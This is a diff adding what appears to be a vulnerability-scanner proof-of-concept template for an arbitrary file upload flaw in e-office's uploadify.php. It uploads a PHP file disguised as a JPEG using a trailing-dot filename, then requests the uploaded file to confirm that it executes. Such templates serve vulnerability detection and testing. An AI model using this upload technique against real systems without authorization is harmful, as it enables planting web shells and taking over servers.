@@ -1,0 +1,29 @@
+name: e-office-uploadify-upload
+groups:
+  poc:
+    - method: POST
+      path: /inc/jquery/uploadify/uploadify.php
+      follow_redirects: false
+      headers: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      body: |
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="Filedata"; filename="{{s1}}.php."
+        Content-Type: image/jpeg
+
+        <?php echo test;?>
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+      expression: >-
+        response.status == 200
+      search: "(?P<token>\\w+)"
+    - method: GET
+      path: /attachment/{{token}}/{{s1}}.php  
+      follow_redirects: false
+      expression: >-
+        response.body.bcontains(b'test')
+
+detail: 
+  links: 
+  authors:
